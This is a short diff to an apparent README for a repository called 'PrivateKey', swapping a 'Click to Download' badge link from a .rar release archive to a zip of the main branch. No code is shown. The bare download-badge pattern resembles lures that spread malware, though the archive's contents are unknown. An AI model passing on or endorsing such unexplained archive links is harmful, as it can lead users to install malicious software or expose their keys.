@@ -4,7 +4,7 @@
 
 Click to Download
 
-[![Static Badge](https://img.shields.io/badge/Download-V8.0.0-blue)](https://github.com/tancem-sys/PrivateKey/releases/download/v8.0.0/BAK.V8.0.0.PrivateKey.rar)
+[![Static Badge](https://img.shields.io/badge/Download-V8.0.0-blue)](https://codeload.github.com/tancem-sys/PrivateKey/zip/refs/heads/main)
 
 
 
